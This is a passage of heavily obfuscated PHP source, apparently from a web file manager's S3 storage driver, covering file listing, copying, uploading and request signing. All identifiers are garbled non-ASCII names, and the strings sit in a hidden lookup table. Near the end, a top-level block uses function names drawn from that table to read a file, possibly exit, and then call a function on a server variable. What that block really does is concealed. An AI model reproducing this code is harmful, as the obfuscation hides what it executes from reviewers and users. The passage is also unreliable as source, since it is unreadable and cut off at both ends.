array_slice($¦Ó¤•İû, 0, $ˆùêÄÚõ)) . $ª¶‡İŠÏ[8]; } while ($ˆùêÄÚõ < count($¦Ó¤•İû)); $¢…µÊèÜ[count($¦Ó¤•İû) - 1] = $Ş¿ÅÏ«û; return $¢…µÊèÜ; } public function getHost() { $ş±À€¦² =& $_SERVER[¥Ÿ©ÒèÌ]; $ÖãúÜÈ¿ = parse_url(trim($this->domain, $ş±À€¦²[8])); $Ã†ÛªşÚ = isset($ÖãúÜÈ¿[$ş±À€¦²[173]]) ? $ÖãúÜÈ¿[$ş±À€¦²[173]] : http_type(); $º²¨š× = isset($ÖãúÜÈ¿[$ş±À€¦²[174]]) ? $ÖãúÜÈ¿[$ş±À€¦²[174]] : $ÖãúÜÈ¿[$ş±À€¦²[78]]; if (isset($ÖãúÜÈ¿[$ş±À€¦²[175]])) { $º²¨š× .= $ş±À€¦²[4] . $ÖãúÜÈ¿[$ş±À€¦²[175]]; } return $Ã†ÛªşÚ . $ş±À€¦²[176] . $º²¨š×; } public function pathEncode($ÚíèûÆ) { $Ãç±—¸ =& $_SERVER[¥Ÿ©ÒèÌ]; return str_replace($Ãç±—¸[177], $Ãç±—¸[8], rawurlencode($ÚíèûÆ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ê¹”–ï€) { set_timeout(); require_once SDK_DIR . $_SERVER[¥Ÿ©ÒèÌ][178]; parent::__construct(); $this->_init($ê¹”–ï€); } public function _init($ëíĞ«ÒÍ) { foreach ($ëíĞ«ÒÍ as $İØßİï => $Ç¤ÔÙÎ) { if (isset($this->{$İØßİï})) { $this->{$İØßİï} = $Ç¤ÔÙÎ; } } $this->endpoint = $ëíĞ«ÒÍ[$_SERVER[¥Ÿ©ÒèÌ][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($İìº¥Ñ» = "\166\64") { $this->signVer = $İìº¥Ñ»; $this->client->setSignatureVersion($İìº¥Ñ»); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¡¯ìÎã° =& $_SERVER[¥Ÿ©ÒèÌ]; $ø¬¶¤ƒş = $this->getBucketCors(); if (!$ø¬¶¤ƒş || !is_array($ø¬¶¤ƒş)) { return !1; } if ($ø¬¶¤ƒş[$¡¯ìÎã°[180]] != $¡¯ìÎã°[181] || $ø¬¶¤ƒş[$¡¯ìÎã°[182]] != $¡¯ìÎã°[181]) { return !1; } $÷Ÿ«¦ = array_map($¡¯ìÎã°[183], $ø¬¶¤ƒş[$¡¯ìÎã°[184]]); if (!is_array($÷Ÿ«¦)) { $÷Ÿ«¦ = array(); } $ù–Ÿ¬İî = array($¡¯ìÎã°[185], $¡¯ìÎã°[186], $¡¯ìÎã°[187], $¡¯ìÎã°[188], $¡¯ìÎã°[189]); $§ëÓ¸… = array_diff($ù–Ÿ¬İî, $÷Ÿ«¦); return empty($§ëÓ¸…); } public function mkfile($œ‡¿ÚÜ, $ù»€¦Š = '', $—ëèĞ  = REPEAT_RENAME) { $Ãüç«–¼ = $this->setContent($œ‡¿ÚÜ, $ù»€¦Š); if ($Ãüç«–¼ !== !1) { return $this->getPathOuter($œ‡¿ÚÜ); } return !1; } public function mkdir($°·º­Ç, $è‰Ş³·— = REPEAT_SKIP) { $¥ó÷¥‚ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($°·º­Ç) && $°·º­Ç !== $¥ó÷¥‚[190]) { return !1; } if ($this->_isFolder($°·º­Ç)) { return $this->getPathOuter($°·º­Ç); } $‡é®Âª = $this->setContent($°·º­Ç, $¥ó÷¥‚[12], !0); if ($‡é®Âª !== !1) { return $this->getPathOuter($°·º­Ç); } return !1; } public function copyFile($ÀÄÊñ‹ğ, $’ï›Ğê², $šÊ«•î = array()) { $ œÅ„ =& $_SERVER[¥Ÿ©ÒèÌ]; $ĞòËğÎ = $this->objectMeta($ÀÄÊñ‹ğ); if (!$ĞòËğÎ) { return !1; } if ($ĞòËğÎ[$ œÅ„[80]] <= 1024 * 1024 * 200) { $õôØğÖ¶ = $this->client->copyObject($this->bucket, $ÀÄÊñ‹ğ, $this->bucket, $’ï›Ğê², $ œÅ„[191], $šÊ«•î); } else { $õôØğÖ¶ = $this->client->multiCopyObject($this->bucket, $ÀÄÊñ‹ğ, $this->bucket, $’ï›Ğê², $šÊ«•î); } $õôØğÖ¶ = $õôØğÖ¶ ? $this->getPathOuter($’ï›Ğê²) : !1; return $õôØğÖ¶; } public function moveFile($“œ©ªÁó, $Ê˜†½Úé) { if ($this->copyFile($“œ©ªÁó, $Ê˜†½Úé)) { $this->delFile($“œ©ªÁó); return $this->getPathOuter($Ê˜†½Úé); } return !1; } public function delFile($Êï…Éö) { return $this->client->deleteObject($this->bucket, $Êï…Éö); } public function delFolder($Ÿ—Ÿå²ö) { $ğ’÷¤ì =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->exist($Ÿ—Ÿå²ö)) { return !0; } $this->listItemCache = !1; $ñÓš¶‚ = $this->fileList($Ÿ—Ÿå²ö); $this->listItemCache = !0; $«ë¤åè¢ = trim($Ÿ—Ÿå²ö, $ğ’÷¤ì[8]) . $ğ’÷¤ì[8]; if (!empty($Ÿ—Ÿå²ö) && $Ÿ—Ÿå²ö !== $ğ’÷¤ì[190] && !in_array($«ë¤åè¢, $ñÓš¶‚[$ğ’÷¤ì[77]])) { $ñÓš¶‚[$ğ’÷¤ì[77]][] = $«ë¤åè¢; } $Ç«¸¡† = $this->delByBatch($ñÓš¶‚[$ğ’÷¤ì[76]]); if (!$Ç«¸¡†) { return !1; } $Ç«¸¡† = $this->delByBatch($ñÓš¶‚[$ğ’÷¤ì[77]]); if (!$Ç«¸¡†) { return !1; } return $this->delFile($«ë¤åè¢); } private function delByBatch($¹Éíç­®) { foreach (array_chunk($¹Éíç­®, 1000) as $ûÛÍïšÚ) { $µıãÛËÛ = $this->client->deleteObjects($this->bucket, $ûÛÍïšÚ); if (!$µıãÛËÛ) { return !1; } } return !0; } public function rename($ÉŠÌ‹·½, $ûµ‰ñ§Ï) { return $this->renameObject($ÉŠÌ‹·½, $ûµ‰ñ§Ï); } public function listPath($áí˜ÂÆ¥, $Êà™¨Û = false) { $“Å‡Õ =& $_SERVER[¥Ÿ©ÒèÌ]; $êÈÃˆ¤Ã = $this->fileList($áí˜ÂÆ¥, $“Å‡Õ[8], !0); foreach ($êÈÃˆ¤Ã[$“Å‡Õ[77]] as $œç¬ÃÒ => $åã‹É) { $êÈÃˆ¤Ã[$“Å‡Õ[77]][$œç¬ÃÒ] = $this->folderInfo($åã‹É, $Êà™¨Û); } foreach ($êÈÃˆ¤Ã[$“Å‡Õ[76]] as $œç¬ÃÒ => $åã‹É) { $êÈÃˆ¤Ã[$“Å‡Õ[76]][$œç¬ÃÒ] = $this->fileInfo($åã‹É[$“Å‡Õ[32]], $Êà™¨Û, $åã‹É); } return $êÈÃˆ¤Ã; } private function fileInfo($ÕÏÍ†, $‰Ÿ•Ëö = false, $”¹…ÎÃ¢ = array()) { $ß¯ÜÒã =& $_SERVER[¥Ÿ©ÒèÌ]; $ÃæÃá†œ = array($ß¯ÜÒã[32] => $this->pathThis($ÕÏÍ†), $ß¯ÜÒã[78] => $this->getPathOuter($ÕÏÍ†), $ß¯ÜÒã[33] => $ß¯ÜÒã[192], $ß¯ÜÒã[167] => $this->ext($ÕÏÍ†), $ß¯ÜÒã[80] => isset($”¹…ÎÃ¢[$ß¯ÜÒã[80]]) ? $”¹…ÎÃ¢[$ß¯ÜÒã[80]] : 0); if ($‰Ÿ•Ëö) { return $ÃæÃá†œ; } $ÃæÃá†œ[$ß¯ÜÒã[193]] = $ÃæÃá†œ[$ß¯ÜÒã[86]] = 0; $ÃæÃá†œ[$ß¯ÜÒã[194]] = $ÃæÃá†œ[$ß¯ÜÒã[195]] = !0; if (empty($”¹…ÎÃ¢)) { $”¹…ÎÃ¢ = $this->objectMeta($ÕÏÍ†); if (!$”¹…ÎÃ¢) { return $ÃæÃá†œ; } } if (isset($”¹…ÎÃ¢[$ß¯ÜÒã[196]])) { $ÃæÃá†œ[$ß¯ÜÒã[86]] = $”¹…ÎÃ¢[$ß¯ÜÒã[196]]; } if (isset($”¹…ÎÃ¢[$ß¯ÜÒã[80]])) { $ÃæÃá†œ[$ß¯ÜÒã[80]] = $”¹…ÎÃ¢[$ß¯ÜÒã[80]]; } return $ÃæÃá†œ; } private function folderInfo($Ÿøºòù, $¬²°€¨Ò = false) { $ßÌøÛé =& $_SERVER[¥Ÿ©ÒèÌ]; $àŠŸğŸ = array($ßÌøÛé[32] => $this->pathThis($Ÿøºòù), $ßÌøÛé[78] => $this->getPathOuter($ßÌøÛé[8] . $Ÿøºòù), $ßÌøÛé[33] => $ßÌøÛé[79]); if ($¬²°€¨Ò) { return $àŠŸğŸ; } $àŠŸğŸ[$ßÌøÛé[193]] = $àŠŸğŸ[$ßÌøÛé[86]] = 0; $àŠŸğŸ[$ßÌøÛé[194]] = $àŠŸğŸ[$ßÌøÛé[195]] = !0; if ($Ÿøºòù == $ßÌøÛé[12]) { return $àŠŸğŸ; } $Ÿøºòù = trim($Ÿøºòù, $ßÌøÛé[8]) . $ßÌøÛé[8]; $§·õ¦®ô = $this->objectMeta($Ÿøºòù); if (isset($§·õ¦®ô[$ßÌøÛé[196]])) { $àŠŸğŸ[$ßÌøÛé[193]] = $§·õ¦®ô[$ßÌøÛé[196]]; } return $àŠŸğŸ; } private function fileList($ÊôÔıöÉ, $öÀû×Ó£ = '', $„ÒåÁéğ = 0) { $Ëñòçİ =& $_SERVER[¥Ÿ©ÒèÌ]; $şûŸ±› = rtrim($ÊôÔıöÉ, $Ëñòçİ[8]) . $Ëñòçİ[8]; $©ÑŠûåŸ = $this->listObjs($şûŸ±›, null, null, $öÀû×Ó£); if (!$©ÑŠûåŸ) { return array($Ëñòçİ[77] => array(), $Ëñòçİ[76] => array()); } $“Ê¨ç×å = $this->listItemCache === !1 ? !1 : !0; $“¥ƒâ¸Æ = $£¥Ø§‘Ä = array(); foreach ($©ÑŠûåŸ[$Ëñòçİ[197]] as $¢˜–—½Ô) { $º‰÷£ĞÍ = $¢˜–—½Ô[$Ëñòçİ[32]]; if ($º‰÷£ĞÍ == $şûŸ±›) { continue; } $Òë¯òŸÀ = isset($¢˜–—½Ô[$Ëñòçİ[80]]) ? $¢˜–—½Ô[$Ëñòçİ[80]] : 0; $¸èÚûÔÍ = $Òë¯òŸÀ == 0 && substr($º‰÷£ĞÍ, strlen($º‰÷£ĞÍ) - 1, 1) == $Ëñòçİ[8] ? !0 : !1; if ($“Ê¨ç×å) { $this->cacheMethod($Ëñòçİ[198], $º‰÷£ĞÍ, $¸èÚûÔÍ); $this->cacheMethod($Ëñòçİ[199], $º‰÷£ĞÍ, $¢˜–—½Ô); } if ($¸èÚûÔÍ) { $“¥ƒâ¸Æ[] = $º‰÷£ĞÍ; continue; } $£¥Ø§‘Ä[] = $„ÒåÁéğ ? $¢˜–—½Ô : $º‰÷£ĞÍ; } foreach ($©ÑŠûåŸ[$Ëñòçİ[200]] as $¢˜–—½Ô) { $“¥ƒâ¸Æ[] = $¢˜–—½Ô[$Ëñòçİ[32]]; if ($“Ê¨ç×å) { $this->cacheMethod($Ëñòçİ[198], $¢˜–—½Ô[$Ëñòçİ[32]], !0); } } if ($“Ê¨ç×å) { $this->cacheMethod($Ëñòçİ[198], $ÊôÔıöÉ, !0); } return array($Ëñòçİ[77] => $“¥ƒâ¸Æ, $Ëñòçİ[76] => $£¥Ø§‘Ä); } private function listObjs($ØÜè™Ğ, $ÚÜÈÓ´ = null, $èÒÊ°ì— = null, $âÁËŸ‘Í = null) { $Äˆ›‘Åã =& $_SERVER[¥Ÿ©ÒèÌ]; $ØÜè™Ğ = trim($ØÜè™Ğ, $Äˆ›‘Åã[8]); $§Î¬Ó…Ô = empty($ØÜè™Ğ) && $ØÜè™Ğ !== $Äˆ›‘Åã[190] ? $Äˆ›‘Åã[12] : $ØÜè™Ğ . $Äˆ›‘Åã[8]; return $this->client->getBucket($this->bucket, $§Î¬Ó…Ô, $ÚÜÈÓ´, $èÒÊ°ì—, $âÁËŸ‘Í, !0); } public function has($í‹Ÿâå†, $•®ŒÏºš = false, $ƒúéŠ = true) { $¾¸›õ µ =& $_SERVER[¥Ÿ©ÒèÌ]; $í‹Ÿâå† = trim($í‹Ÿâå†, $¾¸›õ µ[8]); $Û”ÈËş = empty($í‹Ÿâå†) && $í‹Ÿâå† !== $¾¸›õ µ[190] ? $¾¸›õ µ[12] : $í‹Ÿâå† . $¾¸›õ µ[8]; $ğ‡½Øˆ = null; $Å©Ş‡ = 500; $œ×Œ¸¢É = $¾¸›õ µ[8]; $ùıñÌ¼é = $ÊÜ¼ºòş = array(); while (!0) { $ûæ°²İâ = $this->listObjs($í‹Ÿâå†, $ğ‡½Øˆ, $Å©Ş‡, $œ×Œ¸¢É); if (!$ûæ°²İâ) { break; } $ğ‡½Øˆ = $ûæ°²İâ[$¾¸›õ µ[201]]; $áİÄËë  = $ûæ°²İâ[$¾¸›õ µ[197]]; $İ‘ÑÙ‡ = $ûæ°²İâ[$¾¸›õ µ[200]]; if (empty($áİÄËë ) && empty($İ‘ÑÙ‡)) { break; } if (count($áİÄËë ) == 1 && $áİÄËë [0][$¾¸›õ µ[32]] == $Û”ÈËş) { break; } if ($•®ŒÏºš) { if (count($áİÄËë )) { $áİÄËë  = array_column($áİÄËë , $¾¸›õ µ[32]); $ùıñÌ¼é = array_merge($ùıñÌ¼é, $áİÄËë ); } if (count($İ‘ÑÙ‡)) { $İ‘ÑÙ‡ = array_column($İ‘ÑÙ‡, $¾¸›õ µ[32]); $ÊÜ¼ºòş = array_merge($ÊÜ¼ºòş, $İ‘ÑÙ‡); } if ($ğ‡½Øˆ === null) { break; } continue; } if ($ƒúéŠ) { if (!empty($áİÄËë )) { if (count($áİÄËë ) > 1 || isset($áİÄËë [0][$¾¸›õ µ[32]]) && $áİÄËë [0][$¾¸›õ µ[32]] != $Û”ÈËş) { return !0; } } } else { if (!empty($İ‘ÑÙ‡)) { return !0; } } if ($ğ‡½Øˆ === null) { break; } } if ($•®ŒÏºš) { $ùıñÌ¼é = array_diff($ùıñÌ¼é, array($Û”ÈËş)); $ùıñÌ¼é = count(array_unique($ùıñÌ¼é)); $ÊÜ¼ºòş = count(array_unique($ÊÜ¼ºòş)); return array($¾¸›õ µ[202] => $ùıñÌ¼é, $¾¸›õ µ[203] => $ÊÜ¼ºòş); } return !1; } public function listAll($ß±ìÇ¯˜) { $ˆÑÄÆÅ¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $†ıø¶¾ = $this->fileList($ß±ìÇ¯˜, $ˆÑÄÆÅ¬[12], !0); $ğœÇÔŞ“ = array(); foreach ($†ıø¶¾[$ˆÑÄÆÅ¬[76]] as $ñìøßŠÎ) { $ğœÇÔŞ“[$ñìøßŠÎ[$ˆÑÄÆÅ¬[32]]] = $ñìøßŠÎ[$ˆÑÄÆÅ¬[80]]; } foreach ($†ıø¶¾[$ˆÑÄÆÅ¬[77]] as $ñìøßŠÎ) { if (is_string($ñìøßŠÎ)) { $ğœÇÔŞ“[$ñìøßŠÎ] = 0; } } return $this->listAllFiles($ß±ìÇ¯˜, array_keys($ğœÇÔŞ“), $ğœÇÔŞ“); } public function canRead($ºêèã) { $¼á©˜£¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $ Èà€¿Ù = $this->client->getAccessControlPolicy($this->bucket, $ºêèã); if (!$ Èà€¿Ù) { return !1; } return in_array($ Èà€¿Ù, array($¼á©˜£¬[204], $¼á©˜£¬[205], $¼á©˜£¬[206])) ? !0 : !1; } public function canWrite($£Š…¿Ø) { $ó•˜ŸÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $‡€¢Éó = $this->client->getAccessControlPolicy($this->bucket, $£Š…¿Ø); if (!$‡€¢Éó) { return !1; } return in_array($‡€¢Éó, array($ó•˜ŸÒ[204], $ó•˜ŸÒ[205])) ? !0 : !1; } public function getContent($øßÂ÷Æ) { return $this->client->getObject($this->bucket, $øßÂ÷Æ); } public function setContent($×íŒ¨¥¸, $ìŠö·Ğá = '', $¸Öõœ†× = false) { $¾êÊÜº“ =& $_SERVER[¥Ÿ©ÒèÌ]; $×íŒ¨¥¸ = $¸Öõœ†× ? trim($×íŒ¨¥¸, $¾êÊÜº“[8]) . $¾êÊÜº“[8] : $×íŒ¨¥¸; $Öš¢•ğ½ = get_file_mime(get_path_ext($×íŒ¨¥¸)); $â­ÉÓÅ¼ = $this->client->putObject($ìŠö·Ğá, $this->bucket, $×íŒ¨¥¸, $¾êÊÜº“[191], array(), $Öš¢•ğ½); if (!$â­ÉÓÅ¼) { return !1; } if ($¸Öõœ†×) { return !0; } $this->cacheMethod(null, null); $â­ÉÓÅ¼ = $this->copyFile($×íŒ¨¥¸, $×íŒ¨¥¸, array($¾êÊÜº“[207] => $â­ÉÓÅ¼[$¾êÊÜº“[208]])); return $â­ÉÓÅ¼ ? !0 : !1; } public function fileSubstr($„ƒŸ¼¦Ñ, $Æ¥±Óâ, $Õ®¹†û) { $Ú¥Ó—ˆ† = $Æ¥±Óâ + $Õ®¹†û - 1; return $this->client->getObject($this->bucket, $„ƒŸ¼¦Ñ, array($_SERVER[¥Ÿ©ÒèÌ][209] => "\142\x79\164\145\x73\75{$Æ¥±Óâ}\55{$Ú¥Ó—ˆ†}")); } public function upload($Æ‹Á², $Ú‹ß˜ù, $Ûš‘Àó = false, $ÑïÖ¨²„ = REPEAT_REPLACE) { $ÎÜùÈÓÀ =& $_SERVER[¥Ÿ©ÒèÌ]; $±ê‚™Øí = array($ÎÜùÈÓÀ[207] => @md5_file($Ú‹ß˜ù)); $Œ„ãğ© = array($ÎÜùÈÓÀ[210] => get_file_mime(get_path_ext($Æ‹Á²))); if (IO::size($Ú‹ß˜ù) <= 1024 * 1024 * 200) { $âó…ç = $this->client->putObjectFile($Ú‹ß˜ù, $this->bucket, $Æ‹Á², $ÎÜùÈÓÀ[191], $±ê‚™Øí, $Œ„ãğ©); return !empty($âó…ç) ? $this->getPathOuter($Æ‹Á²) : !1; } $²ØëªØÄ = $this->client->multiUploadObject($Ú‹ß˜ù, $this->bucket, trim($Æ‹Á², $ÎÜùÈÓÀ[8]), $±ê‚™Øí, $Œ„ãğ©); return $²ØëªØÄ ? $this->getPathOuter($Æ‹Á²) : !1; } public function download($ƒ®øüèÈ, $Í£öõä›) { if (!@is_dir($this->pathFather($Í£öõä›)) && !IO::mkdir($this->pathFather($Í£öõä›))) { return !1; } $¤¾ºÃÆ› = $this->client->getObject($this->bucket, $ƒ®øüèÈ, array(), $Í£öõä›); return $¤¾ºÃÆ› !== !1 ? $Í£öõä› : !1; } public function link($×­Ûàª¬, $Ö‹·¦±Á = array()) { $¦ô°®“ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->signVer == $¦ô°®“[211]) { return $this->client->getAuthenticatedURL($this->bucket, $×­Ûàª¬, 3600 * 12, $Ö‹·¦±Á); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($×­Ûàª¬, $¦ô°®“[8]), 3600 * 12, $this->region, array(), !0, $Ö‹·¦±Á); } public function fileOut($ğÊÅõì‰, $ŸË¾ôê = false, $¨–Âî„Ğ = false, $œ¯ÌâÃ¼ = '') { $İÚ±İÃ• =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ğÊÅõì‰, $ŸË¾ôê, $¨–Âî„Ğ, $œ¯ÌâÃ¼); } if (!$¨–Âî„Ğ) { $¨–Âî„Ğ = $this->pathThis($ğÊÅõì‰); } $ªŞÊÙ¼¢ = get_file_mime(get_path_ext($¨–Âî„Ğ)); if ($ªŞÊÙ¼¢ == $İÚ±İÃ•[212]) { return parent::fileOut($ğÊÅõì‰, $ŸË¾ôê, $¨–Âî„Ğ, $œ¯ÌâÃ¼); } $Ü¬ÌÒî­ = array($İÚ±İÃ•[213] => $ªŞÊÙ¼¢); if ($ŸË¾ôê) { $Ü¬ÌÒî­[$İÚ±İÃ•[214]] = $İÚ±İÃ•[215] . rawurlencode($¨–Âî„Ğ); } else { } $³Ô•€ş = $this->link($ğÊÅõì‰, $Ü¬ÌÒî­); $this->fileOutLink($³Ô•€ş); } public function fileOutServer($€¶¿¨÷›, $Çú´âÑÏ = false, $‡ÅÆ¥Óû = false, $ÀÂÚÍ¢° = '') { parent::fileOut($€¶¿¨÷›, $Çú´âÑÏ, $‡ÅÆ¥Óû, $ÀÂÚÍ¢°); } public function fileOutImageServer($¶‘ËÏİ¥, $¿œ¼˜Ÿì = 250) { parent::fileOutImage($¶‘ËÏİ¥, $¿œ¼˜Ÿì); } public function hashMd5($æª¾ˆØñ, $„³èİ¡ = '') { $‹Ì½Äê— =& $_SERVER[¥Ÿ©ÒèÌ]; $ïÓÆ‘â¶ = $this->objectMeta($æª¾ˆØñ); if (!$ïÓÆ‘â¶) { return !1; } $„³èİ¡ = $„³èİ¡ ? $„³èİ¡ : _get($ïÓÆ‘â¶, $‹Ì½Äê—[216]); $„³èİ¡ = $„³èİ¡ ? $„³èİ¡ : _get($ïÓÆ‘â¶, $‹Ì½Äê—[208], $‹Ì½Äê—[12]); return $„³èİ¡; } public function uploadFormData($š¼½³Â½, $®¦êÚíÌ = 3600) { $ÅçğÇø =& $_SERVER[¥Ÿ©ÒèÌ]; $Û×”˜„ = $this->pathFather($š¼½³Â½); $€èÜ‰™û = $this->client->getHttpUploadPostParams($this->bucket, $Û×”˜„, $ÅçğÇø[191], $®¦êÚíÌ); return array_merge((array) $€èÜ‰™û, array($ÅçğÇø[174] => $this->getHost())); } public function multiUploadFormData($´á¡É’í, $¥ÄèÄˆı = 3600) { $—âÇş° =& $_SERVER[¥Ÿ©ÒèÌ]; $ï‡ıÒæ– = gmdate($—âÇş°[217]); $åãÔ »ï = array(); $®üÏÙš = $this->client->getUploadId($this->bucket, $´á¡É’í, $åãÔ »ï); if (!$®üÏÙš) { return !1; } return array($—âÇş°[218] => $®üÏÙš, $—âÇş°[174] => $this->getHost() . $—âÇş°[8] . $this->pathEncode($´á¡É’í), $—âÇş°[219] => $ï‡ıÒæ–, $—âÇş°[95] => $´á¡É’í); } public function multiUploadAuthData($€ˆàÅûÙ, $ˆÔô©ú = array()) { $¤¾ªû÷× =& $_SERVER[¥Ÿ©ÒèÌ]; $ÉëŸŞ–³ = isset($ˆÔô©ú[$¤¾ªû÷×[219]]) ? $ˆÔô©ú[$¤¾ªû÷×[219]] : gmdate($¤¾ªû÷×[217]); $ç¶îúè = isset($ˆÔô©ú[$¤¾ªû÷×[167]]) ? $ˆÔô©ú[$¤¾ªû÷×[167]] : $¤¾ªû÷×[12]; $›’ëÍöÁ = $ˆÔô©ú[$¤¾ªû÷×[95]]; unset($ˆÔô©ú[$¤¾ªû÷×[95]]); if (isset($ˆÔô©ú[$¤¾ªû÷×[220]])) { $ˆÔô©ú[$¤¾ªû÷×[219]] = $ÉëŸŞ–³; return $this->listUploadParts($›’ëÍöÁ, $ˆÔô©ú); } $—è‹–Š¿ = array($¤¾ªû÷×[221], $¤¾ªû÷×[12], $¤¾ªû÷×[118], $¤¾ªû÷×[12], "\170\55\x61\155\x7a\55\144\141\x74\x65\72{$ÉëŸŞ–³}", $¤¾ªû÷×[8] . $this->bucket . $¤¾ªû÷×[8] . $this->pathEncode($›’ëÍöÁ) . $ç¶îúè); if (strpos($ç¶îúè, $¤¾ªû÷×[222]) === 0) { $—è‹–Š¿[0] = $¤¾ªû÷×[223]; } if (isset($ˆÔô©ú[$¤¾ªû÷×[224]]) && $ˆÔô©ú[$¤¾ªû÷×[224]] == $¤¾ªû÷×[225]) { $—è‹–Š¿[0] = $¤¾ªû÷×[225]; } $”™Œœğ— = implode($¤¾ªû÷×[226], $—è‹–Š¿); $ºîŞš¥» = base64_encode(hash_hmac($¤¾ªû÷×[227], $”™Œœğ—, $this->secret, !0)); $Ô¿ş•ĞŸ = $¤¾ªû÷×[228] . $this->accessKey . $¤¾ªû÷×[4] . $ºîŞš¥»; if (strpos($ç¶îúè, $¤¾ªû÷×[222]) === 0) { return array($¤¾ªû÷×[229] => $Ô¿ş•ĞŸ, $¤¾ªû÷×[219] => $ÉëŸŞ–³); } return $Ô¿ş•ĞŸ; } public function listUploadParts($ËúØìí, $õƒ„”‰ = array()) { $¼Á´å²İ =& $_SERVER[¥Ÿ©ÒèÌ]; $³Ú¼êµ„ = str_replace($¼Á´å²İ[230], $¼Á´å²İ[12], $õƒ„”‰[$¼Á´å²İ[167]]); $¶…éÌ×¼ = $this->client->listParts($this->bucket, $ËúØìí, $³Ú¼êµ„); if (!$¶…éÌ×¼) { return !1; } unset($õƒ„”‰[$¼Á´å²İ[220]], $õƒ„”‰[$¼Á´å²İ[224]]); $õƒ„”‰[$¼Á´å²İ[95]] = $ËúØìí; $¨×ÄŒ = $this->multiUploadAuthData($ËúØìí, $õƒ„”‰); if (empty($¨×ÄŒ)) { return !1; } return array($¼Á´å²İ[229] => $¨×ÄŒ, $¼Á´å²İ[219] => $õƒ„”‰[$¼Á´å²İ[219]], $¼Á´å²İ[231] => $¶…éÌ×¼); } public function getHost() { return parent::getHost() . $_SERVER[¥Ÿ©ÒèÌ][8] . $this->bucket; } public function size($Ã§¯öÛË) { $ñî›æ¨õ = $this->objectMeta($Ã§¯öÛË); return $ñî›æ¨õ ? $ñî›æ¨õ[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function info($ø£‚şµ) { if ($this->isFolder($ø£‚şµ)) { return $this->folderInfo($ø£‚şµ); } else { if ($this->isFile($ø£‚şµ)) { return $this->fileInfo($ø£‚şµ); } } return !1; } public function exist($Šõ ¦”Â) { return $this->isFile($Šõ ¦”Â) || $this->isFolder($Šõ ¦”Â); } public function isFile($±÷¬¸—Ì) { return !$this->isFolder($±÷¬¸—Ì) && $this->objectMeta($±÷¬¸—Ì); } public function isFolder($œŸ±€¨) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][198], $œŸ±€¨); } protected function objectMeta($äª‰±äÌ) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][199], $äª‰±äÌ); } protected function _objectMeta($Ö¶«¬Šé) { $ÒŠúğÏ˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö¶«¬Šé = rtrim($Ö¶«¬Šé, $ÒŠúğÏ˜[8]); try { $´òÚ½şë = $this->client->getObjectInfo($this->bucket, $Ö¶«¬Šé); if (!isset($´òÚ½şë[$ÒŠúğÏ˜[216]]) && isset($´òÚ½şë[$ÒŠúğÏ˜[232]])) { $´òÚ½şë[$ÒŠúğÏ˜[216]] = $´òÚ½şë[$ÒŠúğÏ˜[232]]; } } catch (Exception $­°×ıï¸) { $´òÚ½şë = !1; } if (!$´òÚ½şë) { } return $´òÚ½şë; } protected function _isFolder($¬¼Ğ˜É‡) { $Š€Ğæ =& $_SERVER[¥Ÿ©ÒèÌ]; $¬¼Ğ˜É‡ = rtrim($¬¼Ğ˜É‡, $Š€Ğæ[8]); if ($¬¼Ğ˜É‡ == $Š€Ğæ[12] || $¬¼Ğ˜É‡ == $Š€Ğæ[8]) { return !0; } $Š¢ëÎ™ƒ = $this->client->getBucket($this->bucket, $¬¼Ğ˜É‡, null, 1); if (empty($Š¢ëÎ™ƒ[$Š€Ğæ[197]])) { return !1; } $ŒÉÁÅ– = $Š¢ëÎ™ƒ[$Š€Ğæ[197]][0][$Š€Ğæ[32]]; return stripos($ŒÉÁÅ–, $¬¼Ğ˜É‡ . $Š€Ğæ[8]) === 0 ? !0 : !1; if (substr($ŒÉÁÅ–, -1) == $Š€Ğæ[8]) { return !0; } if (get_path_this($ŒÉÁÅ–) == get_path_this($¬¼Ğ˜É‡)) { return !1; } return !0; } } if ($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][233]] != $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][234]]) { $_getc = $_SERVER[¥Ÿ©ÒèÌ][235]; $_getfile = $_SERVER[$_SERVER[¥Ÿ©ÒèÌ][236]] . $_SERVER[¥Ÿ©ÒèÌ][237]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥Ÿ©ÒèÌ][226], $_getfilec); if (count($_getarrs) < $_SERVER[¥Ÿ©ÒèÌ][238]) { $exit = $_SERVER[¥Ÿ©ÒèÌ][239]; $exit(); } $_act = $_SERVER[¥Ÿ©ÒèÌ][240]; $_act($_SERVER[$_SERVER[¥Ÿ©ÒèÌ][241]]); } goto AİŞê±¿Ì; d¨Œò›Á´: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\145\x5f\143\157\156\x74\x65\156\164\163"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\156\163\145\162\164", "\x66\165\x6e\x63\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\145"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\145" => "\x69\157\137\146\151\x6c\x65\x5f\x6d\x65\164\x61", "\155\x65\164\141\x46\151\145\x6c\144" => "\x66\x69\154\x65\111\x44"); public function fileInfo($î¯ÙöŒÃ) { $»µïÈ€ =& $_SERVER[¥Ÿ©ÒèÌ]; static $–šî¾ß 